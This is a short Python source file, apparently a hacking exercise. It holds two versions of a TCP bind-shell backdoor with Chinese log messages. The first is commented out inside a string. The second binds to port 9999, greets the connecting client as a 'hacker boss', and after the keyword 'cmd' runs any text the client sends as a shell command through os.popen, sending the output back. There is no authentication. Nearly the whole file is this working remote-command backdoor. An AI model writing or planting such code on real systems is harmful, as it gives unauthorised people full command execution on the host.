'''import os
import socket

def main():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    host=socket.gethostname()
    port=9999
    s.bind((host,port))
    s.listen(5)

    while True:
        c,addr=s.accept()
        print("连接地址是:",addr)
        c.send("欢迎".encode("utf-8"))

        while True:
            try:
                recv_data=c.recv(1024).decode("utf-8")
                print(recv_data)
                if recv_data=='cmd':
                    while True:
                        c.send("cmd ok".encode("utf-8"))
                        data=c.recv(1024)
                        recv_data2=data.decode("utf-8")
                        if recv_data2=='exit':
                            c .send("cmd stop".encode("utf-8"))
                            break
                        else:
                            x=os.popen(recv_data2).read()
                            print(x.encode("utf-8"))

            except:
                print("断开连接")
                break

        c.close()
        break
    s.close()
    pass

if __name__=='__name__':
    main()'''

import socket
import os
def main():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    host='192.168.31.205'
    port=9999
    s.bind((host,port))
    s.listen(5)

    while True:
        c,addr=s.accept()
        print("连接地址是:",addr)
        c.send("欢迎黑客大佬".encode("utf-8"))

        while True:
            try:
                recv_data=c.recv(1024).decode("utf-8")
                print(recv_data)
                if recv_data == 'cmd':
                    while True:
                        c.send("ok cmd start".encode("utf-8"))
                        data=c.recv(1024)
                        recv_data2=data.decode("utf-8")
                        if recv_data2 == 'exit':
                            c.send("ok cmd stop".encode("utf-8"))
                            break
                        else:
                            x=os.popen(recv_data2).read()
                            c.send(x.encode("utf-8"))

                else:
                    c.send(recv_data.encode("utf-8"))
            except:
                print("断开连接")
                break
        c.close()
    s.close()
pass

if __name__=='__main__':
    main()